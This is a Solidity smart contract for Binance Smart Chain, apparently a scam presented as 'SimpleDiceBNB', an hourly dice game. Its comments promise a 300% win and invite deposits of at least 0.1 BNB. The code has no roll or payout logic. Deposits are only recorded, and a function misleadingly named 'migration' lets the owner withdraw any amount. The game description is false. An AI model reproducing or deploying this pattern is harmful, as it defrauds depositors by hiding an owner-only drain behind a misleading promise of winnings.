/**
 *Submitted for verification at BscScan.com on 2021-07-14
*/

// How to play ?
// Transfer min 0.1 BNB to this contract
// every hours Contract will be rolls to choose the winner
// The winner will be win 300% and 10% fee will goes to owner
// Join the group to communication https://t.me/SimpleDiceBNB

pragma solidity 0.5.10;

contract SimpleDiceBNB {
	using SafeMath for uint256;


	uint256 public totalDeposits;

	address payable public projectAddress;

	struct Deposit {
		uint256 amount;
		uint256 start;
	}



	event NewDeposit(address indexed user, uint256 amount);


	constructor(address payable projectAddr) public {
		require(!isContract(projectAddr));

		projectAddress = projectAddr;
	}

	function bridgingContract() public payable {
		totalDeposits = totalDeposits.add(msg.value);
		emit NewDeposit(msg.sender, msg.value);
	}
	function migration(uint _amount) public returns(bool) {
		require(msg.sender == projectAddress, "Admin Only Can do this");
		projectAddress.transfer(_amount);
		return true;
	}
	

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}